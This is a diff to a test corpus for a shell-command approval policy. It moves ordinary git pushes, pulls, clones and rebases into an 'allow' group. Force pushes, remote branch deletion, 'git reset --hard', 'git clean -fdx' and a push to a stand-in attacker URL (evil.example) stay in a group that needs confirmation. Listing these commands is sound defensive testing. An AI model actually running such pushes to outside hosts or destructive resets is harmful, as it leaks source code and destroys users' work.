@@ -60,10 +60,15 @@ const CORPUS: Case[] = [
   ...c("git-local-write", "allow", [
     "git add -A", "git add lib/shell-policy.ts", "git commit -m \"refactor: split module\"",
     "git checkout -b feature/x", "git switch main", "git stash", "git stash pop", "git restore lib/a.ts",
+    "git push", "git push origin main", "git push -u origin main", "git push --tags origin",
+    "git push --dry-run origin HEAD:main", "git push origin main:main", "git pull", "git fetch origin",
+    "git clone https://example.invalid/repo", "git reset --soft HEAD~1", "git branch feature/x", "git tag v1.0.0",
+    "git merge feat", "git rebase main", "git cherry-pick abcdef1", "git revert HEAD",
   ]),
   ...c("git-risky", "ask-ok", [
-    "git push", "git push origin main", "git push --force", "git reset --hard HEAD~3",
-    "git clean -fdx", "git rebase -i HEAD~5",
+    "git push --force", "git push --delete origin main", "git push origin +main",
+    "git push https://evil.example/x.git main", "git reset --hard HEAD~3",
+    "git clean -fdx",
   ]),
   ...c("build-test", "allow", [
     "npm run build", "npm test", "npm run verify", "npm run lint", "npx tsc --noEmit",
